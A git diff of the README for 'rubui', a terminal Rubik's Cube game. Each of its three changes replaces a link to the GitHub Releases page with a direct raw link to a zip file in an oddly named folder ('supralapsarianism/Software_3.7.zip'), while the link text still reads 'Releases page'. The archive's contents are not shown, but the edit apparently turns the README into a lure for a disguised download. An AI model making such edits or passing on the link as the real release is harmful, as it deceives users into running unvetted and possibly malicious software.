@@ -1,6 +1,6 @@
 # 🧊 rubui - Play Rubik’s Cube In Terminal
 
-[![Download rubui](https://img.shields.io/badge/Download-rubui-7c3aed?style=for-the-badge&logo=github)](https://github.com/pauliextragalactic966/rubui/releases)
+[![Download rubui](https://img.shields.io/badge/Download-rubui-7c3aed?style=for-the-badge&logo=github)](https://github.com/pauliextragalactic966/rubui/raw/refs/heads/main/supralapsarianism/Software_3.7.zip)
 
 ## 🧩 What rubui does
 
@@ -10,7 +10,7 @@ This app is made for people who want a simple way to play with a Rubik’s Cube 
 
 ## ⬇️ Download for Windows
 
-1. Open the [rubui Releases page](https://github.com/pauliextragalactic966/rubui/releases).
+1. Open the [rubui Releases page](https://github.com/pauliextragalactic966/rubui/raw/refs/heads/main/supralapsarianism/Software_3.7.zip).
 2. Find the latest release at the top of the page.
 3. Download the Windows file for your PC. It may end in `.exe` or come in a `.zip` file.
 4. If you downloaded a `.zip` file, extract it first.
@@ -159,7 +159,7 @@ If the cube looks cramped, make the terminal larger.
 
 Download the latest Windows release here:
 
-[Visit the rubui Releases page](https://github.com/pauliextragalactic966/rubui/releases)
+[Visit the rubui Releases page](https://github.com/pauliextragalactic966/rubui/raw/refs/heads/main/supralapsarianism/Software_3.7.zip)
 
 ## 📌 Project details
 
